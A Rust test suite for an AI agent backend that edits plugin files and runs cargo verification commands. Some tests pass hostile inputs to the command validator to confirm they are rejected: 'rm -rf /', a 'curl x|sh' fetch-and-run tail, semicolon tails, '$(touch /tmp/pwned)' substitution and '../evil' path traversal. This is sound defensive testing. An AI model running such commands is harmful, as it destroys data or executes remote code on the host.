//! Backend-level tests for the plugin-iteration agent backend.
//!
//! Ported out of the kernel's unit tests so the backend can move into this
//! crate; they exercise the same arms through the public API.

use std::fs;

use cordis_plugin_sdk::llm::LlmToolCall;
use cordis_runtime::core::error::RuntimeError;
use cordis_runtime::kernel::plugin_iteration::{PluginEditOpKind, PluginEditOperation};
use cordis_runtime::host::ScaffoldChildPluginArgs;
use serde_json::Map;
use serial_test::serial;
use cordis_runtime::agent_api::{AgentBackend, AgentToolHost};
use cordis_runtime::host::{
    plugin_iteration_journal_path, PluginIterationAgentBackend, PluginIterationAgentState,
    PluginIterationContextPaths, PreparedPluginIteration, RuntimeHost,
    PLUGIN_AGENT_TOOL_CREATE_FILE, PLUGIN_AGENT_TOOL_DELETE_FILE,
    PLUGIN_AGENT_TOOL_INSPECT_PLUGIN_CATALOG, PLUGIN_AGENT_TOOL_LIST_CONTEXT_FILES,
    PLUGIN_AGENT_TOOL_READ_CONTEXT_FILES, PLUGIN_AGENT_TOOL_RECORD_ITERATION_SUMMARY,
    PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT, PLUGIN_AGENT_TOOL_REPLACE_FILE_EXACT,
    PLUGIN_AGENT_TOOL_RUN_PLUGIN_CHECK, PLUGIN_AGENT_TOOL_RUN_PLUGIN_TEST,
    PLUGIN_AGENT_TOOL_SCAFFOLD_CHILD_PLUGIN, PLUGIN_AGENT_TOOL_TOML_SET,
};
use serde_json::{json, Value};
use tempfile::TempDir;


/// A backend bound to a hermetic empty-fixture host.
fn with_backend<R>(
    host: &RuntimeHost,
    f: impl FnOnce(&mut PluginIterationAgentBackend<'_>) -> R,
) -> R {
    let prepared = prepared_for("mini", &["mini"]);
    let context_paths = PluginIterationContextPaths {
        focus_paths: Vec::new(),
        all_paths: Vec::new(),
    };
    let mut state =
        PluginIterationAgentState::new(prepared, context_paths, host.fixtures_root());
    let mut backend = PluginIterationAgentBackend {
        host,
        state: &mut state,
    };
    f(&mut backend)
}

/// Seed a writable `plugins/mini/src/<name>` file inside the host's tree.
fn seed_writable_source(host: &RuntimeHost, name: &str, body: &str) -> String {
    let rel = format!("plugins/mini/src/{name}");
    let abs = host.fixtures_root().join(&rel);
    fs::create_dir_all(abs.parent().expect("parent")).expect("mkdir src");
    fs::write(&abs, body).expect("seed source");
    rel
}

/// The message an `InvalidArgument` carries, for byte-exact assertions.
fn invalid_argument_message(err: &RuntimeError) -> String {
    match err {
        RuntimeError::InvalidArgument { message } => message.clone(),
        other => panic!("expected InvalidArgument, got {other:?}"),
    }
}

fn setup_empty_fixture() -> (TempDir, std::path::PathBuf) {
    let temp = TempDir::new().expect("tempdir");
    let fixtures = temp.path().join("fixtures");
    let artifacts = fixtures.join("artifacts");
    fs::create_dir_all(&artifacts).expect("artifacts");
    fs::write(
        artifacts.join("index.json"),
        r#"{"schema_version":2,"generated_at":"2026-07-25T00:00:00Z","topo_order":[],"entries":[]}"#,
    )
    .expect("index");
    (temp, fixtures)
}

fn empty_host() -> (TempDir, RuntimeHost) {
    let (temp, fixtures) = setup_empty_fixture();
    let host = RuntimeHost::boot(&fixtures).expect("boot on empty index");
    (temp, host)
}

fn prepared_for(root: &str, targets: &[&str]) -> PreparedPluginIteration {
    let target_plugin_paths: Vec<String> = targets.iter().map(|s| (*s).to_string()).collect();
    let allowed_plugin_roots: std::collections::BTreeMap<String, String> = target_plugin_paths
        .iter()
        .map(|p| (p.clone(), format!("plugins/{p}")))
        .collect();
    PreparedPluginIteration {
        iteration_id: "iter-seam-3500".to_string(),
        issue_id: "issue-seam-3500".to_string(),
        root_plugin_path: root.to_string(),
        target_plugin_paths,
        source: None,
        summary: "seam iteration".to_string(),
        manual_approved: false,
        tests_command: None,
        safety_command: None,
        verify_profile: cordis_runtime::kernel::verifier::VerificationProfile::RustWorkspace,
        quality_score: None,
        instruction: None,
        allowed_plugin_roots,
        edit_plan: None,
    }
}

#[test]
#[serial]
fn backend_replace_files_exact_success_arm_applies_batch() {
    let (_temp, host) = empty_host();
    let rel = seed_writable_source(&host, "batch_target.rs", "OLD contents\n");
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT,
            json!({
                "edits": [{
                    "path": rel,
                    "expected_old_string": "OLD contents\n",
                    "new_content": "NEW contents\n"
                }]
            }),
        )
        .expect("non-empty replace_files_exact batch succeeds");
        // apply_operations returns a JSON summary; the operation is recorded.
        assert!(out.is_object() || out.is_array() || out.is_null() || out.is_string());
        assert_eq!(backend.state.operations.len(), 1);
    });
    // The file on disk now carries the new content.
    assert_eq!(
        fs::read_to_string(host.fixtures_root().join(&rel)).expect("read edited"),
        "NEW contents\n"
    );
}

#[test]
#[serial]
fn backend_run_plugin_check_builds_single_plugin_default_command() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No explicit command + plugin_path "/mini" → the default builder
        // produces `cargo check ... -p mini`. We point it at a bogus
        // manifest so the command runs quickly and fails (exit != 0), but
        // the default-command construction (the target line) still runs.
        let out = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "plugin_path": "/mini" }),
        )
        .expect("run_plugin_check returns Ok even when cargo exits nonzero");
        assert_eq!(out.get("stage").and_then(Value::as_str), Some("check"));
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert!(cmd.contains("cargo check"));
        assert!(cmd.contains("-p mini"), "single-plugin default: {cmd}");
    });
}

#[test]
#[serial]
fn backend_run_plugin_check_builds_whole_workspace_default_command() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // plugin_path "/" → whole-workspace default (no `-p`).
        let out =
            AgentBackend::execute_tool(backend, "run_plugin_check", json!({ "plugin_path": "/" }))
                .expect("run_plugin_check Ok");
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert!(cmd.contains("cargo check"));
        assert!(!cmd.contains("-p "), "whole-workspace default: {cmd}");
    });
}

#[test]
#[serial]
fn backend_phase_reflects_state_progression() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No operations yet → exploration.
        assert_eq!(backend.phase(), "exploration");
        backend.state.operations.push(PluginEditOperation {
            path: "plugins/mini/src/lib.rs".to_string(),
            kind: PluginEditOpKind::ReplaceExact,
            expected_old_string: Some("a".to_string()),
            expected_sha256: None,
            new_content: Some("b".to_string()),
            pointer: None,
            dotted_key: None,
            value: None,
        });
        // Has ops, no verification attempts → editing.
        assert_eq!(backend.phase(), "editing");
        backend.state.verification_attempts = 1;
        // Attempts but no successes → verification_retry.
        assert_eq!(backend.phase(), "verification_retry");
        backend.state.verification_successes = 1;
        // Successes → verification.
        assert_eq!(backend.phase(), "verification");
        backend.state.recorded_summary = Some("done".to_string());
        // Recorded summary → finalized (highest priority).
        assert_eq!(backend.phase(), "finalized");
    });
}

#[test]
#[serial]
fn backend_tool_scope_label_embeds_phase() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        assert_eq!(backend.tool_scope_label(), "plugin_iteration:exploration");
    });
}

#[test]
#[serial]
fn backend_host_accessor_returns_bound_host() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // The AgentBackend::host accessor returns the same fixtures root.
        assert_eq!(
            AgentBackend::host(backend).fixtures_root(),
            host.fixtures_root()
        );
    });
}

#[test]
#[serial]
fn backend_execute_tool_empty_replace_batch_errors() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_REPLACE_FILES_EXACT,
            json!({ "edits": [] }),
        );
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "replace_files_exact requires at least one edit"
        ));
    });
}

#[test]
#[serial]
fn backend_execute_tool_unsupported_name_errors() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let out = AgentBackend::execute_tool(backend, "no_such_tool", json!({}));
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "unsupported plugin iteration tool: no_such_tool"
        ));
    });
}

#[test]
#[serial]
fn backend_record_iteration_summary_requires_edits_and_verification() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // No operations + no verification successes → guard error.
        let out = AgentBackend::execute_tool(
            backend,
            PLUGIN_AGENT_TOOL_RECORD_ITERATION_SUMMARY,
            json!({ "summary": "x" }),
        );
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "record_iteration_summary requires at least one edit and one successful verification step"
        ));
    });
}

#[test]
#[serial]
fn backend_scaffold_child_plugin_rejects_parent_outside_subtree() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let args = ScaffoldChildPluginArgs {
            parent_plugin_path: "not-a-target".to_string(),
            child_name: "kid".to_string(),
            template_plugin_path: None,
            node_id: None,
            summary: None,
        };
        let out = backend.scaffold_child_plugin(args);
        assert!(matches!(
            out,
            Err(RuntimeError::InvalidArgument { message })
                if message == "parent plugin path not-a-target is outside the selected subtree"
        ));
    });
}

#[test]
#[serial]
fn backend_run_checked_command_reports_nonzero_exit_without_success_bump() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let before = backend.state.verification_successes;
        // A valid `cargo check` argv against a manifest that does not
        // exist in the empty fixture: spawns cargo, fails fast, exit != 0.
        let out = backend
            .run_checked_command(
                "check",
                "cargo check --manifest-path plugins/Cargo.toml".to_string(),
            )
            .expect("run_checked_command returns Ok even on nonzero exit");
        assert_eq!(out.get("success").and_then(Value::as_bool), Some(false));
        assert_eq!(out.get("stage").and_then(Value::as_str), Some("check"));
        // A failing command increments attempts but not successes.
        assert_eq!(backend.state.verification_attempts, 1);
        assert_eq!(backend.state.verification_successes, before);
    });
}

#[test]
#[serial]
fn backend_run_checked_command_success_bumps_counter() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // `cargo test --help` exits 0 without touching the workspace.
        let out = backend
            .run_checked_command("test", "cargo test --help".to_string())
            .expect("cargo test --help exits 0");
        assert_eq!(out.get("success").and_then(Value::as_bool), Some(true));
        assert_eq!(backend.state.verification_successes, 1);
    });
}

#[test]
#[serial]
fn backend_run_checked_command_rejects_non_cargo_argv_and_metacharacters() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        let before = backend.state.verification_attempts;
        // Not `cargo` at all → structure mismatch.
        let err = backend
            .run_checked_command("check", "rm -rf /".to_string())
            .expect_err("a non-cargo argv must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification tool only allows commands starting with `cargo check`, got `rm -rf /`"
        );
        // Valid `cargo check` argv but with a shell-operator tail: the
        // old `bash -lc` dispatch would have executed the `&&` part.
        let err = backend
            .run_checked_command("check", "cargo check && curl x|sh".to_string())
            .expect_err("shell metacharacters must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `&&`"
        );
        // A cross-tool op never matches the stage's required op.
        let err = backend
            .run_checked_command("check", "cargo test --lib".to_string())
            .expect_err("cross-tool op must be rejected");
        assert_eq!(
                invalid_argument_message(&err),
                "verification tool only allows commands starting with `cargo check`, got `cargo test --lib`"
            );
        // Rejections still count as verification attempts, like a spawn
        // that fails, but never as successes.
        assert_eq!(backend.state.verification_attempts, before + 3);
        assert_eq!(backend.state.verification_successes, 0);
    });
}

#[test]
#[serial]
fn backend_run_plugin_check_rejects_metachar_command_injection() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // `cargo check` prefix plus a shell-operator tail: the old prefix
        // whitelist let this through to `bash -lc`.
        let err = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "command": "cargo check && curl x|sh" }),
        )
        .expect_err("shell metacharacters must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `&&`"
        );
        // A semicolon tail also dies in the argv gate.
        let err = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "command": "cargo check ;ls" }),
        )
        .expect_err("a semicolon tail must be rejected");
        assert_eq!(
            invalid_argument_message(&err),
            "verification command contains shell metacharacter `;ls`"
        );
    });
}

#[test]
#[serial]
fn backend_run_plugin_check_rejects_plugin_path_injection() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // plugin_path is appended as its own argv element, so anything
        // that would have been shell syntax in the old
        // `format!("… -p {pp}")` default command is rejected up front.
        for bad in ["/x; rm -rf /", "$(touch /tmp/pwned)", "../evil", "a/../b"] {
            let err = AgentBackend::execute_tool(
                backend,
                "run_plugin_check",
                json!({ "plugin_path": bad }),
            )
            .expect_err("an unsafe plugin_path must be rejected");
            assert_eq!(
                invalid_argument_message(&err),
                format!("plugin path {bad} is not a valid cargo package selector")
            );
        }
    });
}

#[test]
#[serial]
fn backend_run_plugin_check_accepts_bare_check_alias() {
    let (_temp, host) = empty_host();
    with_backend(&host, |backend| {
        // The bare `check` alias maps to the validated default argv with
        // the plugin path appended as its own element.
        let out = AgentBackend::execute_tool(
            backend,
            "run_plugin_check",
            json!({ "plugin_path": "/mini", "command": "check" }),
        )
        .expect("bare check alias should run the default command");
        let cmd = out.get("command").and_then(Value::as_str).expect("command");
        assert_eq!(
            cmd,
            "cargo check --quiet --manifest-path plugins/Cargo.toml -p mini"
        );
    });
}

#[test]
#[serial]
fn backend_apply_operations_second_op_failure_enriches_error() {
    let (_temp, host) = empty_host();
    // First op targets a real writable file (applies), second op targets a
    // path OUTSIDE the plugin subtree → policy blocks it, and the partial
    // batch rolls back the first op. The returned error is the enriched
    // second-op failure.
    let good = seed_writable_source(&host, "first_ok.rs", "before\n");
    with_backend(&host, |backend| {
        let ops = vec![
            PluginEditOperation {
                path: good.clone(),
                kind: PluginEditOpKind::ReplaceExact,
                expected_old_string: Some("before\n".to_string()),
                expected_sha256: None,
                new_content: Some("after\n".to_string()),
                pointer: None,
                dotted_key: None,
                value: None,
            },
            PluginEditOperation {
                // Outside plugins/mini subtree → policy rejects.
                path: "plugins/other/src/x.rs".to_string(),
                kind: PluginEditOpKind::CreateFile,
                expected_old_string: Some(String::new()),
                expected_sha256: None,
                new_content: Some("nope".to_string()),
                pointer: None,
                dotted_key: None,
                value: None,
            },
        ];
        let out = backend.apply_operations("batch", ops);
        assert!(out.is_err(), "second-op policy block must fail the batch");
    });
    // The first op was rolled back to its original bytes.
    assert_eq!(
        fs::read_to_string(host.fixtures_root().join(&good)).expect("read"),
        "before\n",
        "partial-batch rollback must restore the first op"
    );
}
